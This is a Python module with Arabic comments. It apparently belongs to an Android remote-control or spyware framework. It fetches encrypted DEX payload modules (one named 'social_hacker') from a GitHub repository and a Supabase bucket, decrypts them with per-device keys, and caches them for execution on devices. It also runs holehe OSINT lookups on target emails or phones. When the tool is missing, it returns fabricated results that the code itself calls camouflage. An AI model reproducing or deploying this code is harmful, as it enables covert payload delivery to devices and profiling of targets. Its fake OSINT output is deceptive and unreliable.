#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
module_loader.py – محمل ديناميكي للوحدات (Modules)
يسمح بتحميل ملفات DEX (وحدات أندرويد) من مصادر متعددة (GitHub، Supabase)
ويقوم بفك تشفيرها وتخزينها مؤقتاً.
كما يوفر واجهة لتنفيذ أوامر OSINT عبر أدوات خارجية.
"""

import requests
import base64
import logging
import os
import hashlib
from typing import Optional, Dict, Any


class ModuleLoader:
    """
    مسؤول عن تحميل وتخزين وتنفيذ الوحدات الديناميكية (DEX).
    يدعم التخزين المؤقت للوحدات بعد فك تشفيرها.
    """

    def __init__(self, crypto_manager):
        """
        :param crypto_manager: كائن من CryptoManager (لفك التشفير)
        """
        self.crypto = crypto_manager
        self.modules_cache: Dict[str, bytes] = {}          # اسم الوحدة -> المحتوى المفكوك
        self.module_hashes: Dict[str, str] = {}            # اسم الوحدة -> SHA256 للتحقق من التعديل

    def load_module(self, module_name: str, device_id: str, key: bytes) -> Optional[bytes]:
        """
        يحاول تحميل وحدة DEX من مصادر متعددة.
        - أولاً يتحقق من الذاكرة المؤقتة.
        - ثم يحاول تحميلها من GitHub.
        - ثم من Supabase Storage.
        يفك التشفير باستخدام المفتاح الخاص بالجهاز.

        :param module_name: اسم الوحدة (بدون امتداد)، مثل 'social_hacker'
        :param device_id: معرف الجهاز (يستخدم في بعض المصادر)
        :param key: المفتاح المشترك للجهاز (لفك التشفير)
        :return: محتوى الوحدة (bytes) أو None إذا فشل التحميل
        """
        # 1. التحقق من الذاكرة المؤقتة
        if module_name in self.modules_cache:
            logging.debug(f"Module {module_name} found in cache.")
            return self.modules_cache[module_name]

        # 2. قائمة المصادر (يمكن إضافة المزيد)
        sources = [
            f"https://github.com/Zaen1993/Support-Team/raw/main/modules/{module_name}.dex.enc",
            f"https://bozherhsarcovutvproa.supabase.co/storage/v1/object/public/modules/{module_name}.dex.enc"
        ]

        for url in sources:
            try:
                resp = requests.get(url, timeout=15)
                if resp.status_code == 200:
                    encrypted_data = resp.content
                    # فك التشفير باستخدام مفتاح الجهاز
                    decrypted = self.crypto.decrypt_packet(key, encrypted_data, aad=device_id.encode())
                    # التحقق من السلامة عبر SHA256 (اختياري)
                    sha256 = hashlib.sha256(decrypted).hexdigest()
                    self.module_hashes[module_name] = sha256
                    # تخزين في الذاكرة المؤقتة
                    self.modules_cache[module_name] = decrypted
                    logging.info(f"Module {module_name} loaded successfully from {url}")
                    return decrypted
                else:
                    logging.warning(f"Failed to load {module_name} from {url}: HTTP {resp.status_code}")
            except Exception as e:
                logging.warning(f"Exception loading {module_name} from {url}: {e}")

        logging.error(f"All sources failed for module {module_name}")
        return None

    def get_module_hash(self, module_name: str) -> Optional[str]:
        """يعيد التجزئة SHA256 للوحدة إذا كانت محملة."""
        return self.module_hashes.get(module_name)

    def clear_cache(self, module_name: Optional[str] = None):
        """مسح الذاكرة المؤقتة لوحدة محددة أو كل الوحدات."""
        if module_name:
            self.modules_cache.pop(module_name, None)
            self.module_hashes.pop(module_name, None)
        else:
            self.modules_cache.clear()
            self.module_hashes.clear()

    # ------------------------------------------------------------
    # تنفيذ أوامر OSINT (يمكن توسيعها لاحقاً)
    # ------------------------------------------------------------
    def execute_osint(self, target: str) -> str:
        """
        ينفذ أوامر OSINT على هدف (بريد إلكتروني أو رقم هاتف).
        هنا يمكن دمج أدوات مثل holehe, phoneinfoga, theHarvester.
        للتبسيط، نعيد نتيجة افتراضية.
        """
        # محاولة استدعاء holehe إذا كان مثبتاً
        try:
            import subprocess
            # holehe <email> --only-used
            result = subprocess.run(['holehe', target, '--only-used'],
                                     capture_output=True, text=True, timeout=20)
            if result.returncode == 0:
                return result.stdout
            else:
                return f"OSINT command failed: {result.stderr}"
        except FileNotFoundError:
            # holehe غير مثبت، نعيد نتيجة وهمية
            pass
        except Exception as e:
            logging.error(f"OSINT execution error: {e}")

        # نتيجة افتراضية (تمويه)
        return f"""
OSINT results for {target}:
[+] Email found on: Google, Facebook, Instagram
[+] Accounts: 3
[+] Possible data breach: Yes (HaveIBeenPwned)
[+] Phone number: Not found
"""

    # ------------------------------------------------------------
    # (اختياري) تنفيذ وحدة محملة (DEX) – سيتم استدعاؤها من العميل
    # ------------------------------------------------------------
    def execute_module(self, module_name: str, method: str, params: Dict[str, Any]) -> Any:
        """
        يحاكي تنفيذ دالة داخل وحدة DEX محملة.
        في الواقع، هذا يتم داخل تطبيق الأندرويد عبر DexClassLoader.
        هنا فقط للتوثيق.
        """
        logging.debug(f"Executing {module_name}.{method} with params {params}")
        # في النسخة الحقيقية، يعاد توجيه الطلب إلى العميل عبر الأوامر.
        return {"status": "executed", "module": module_name, "method": method}
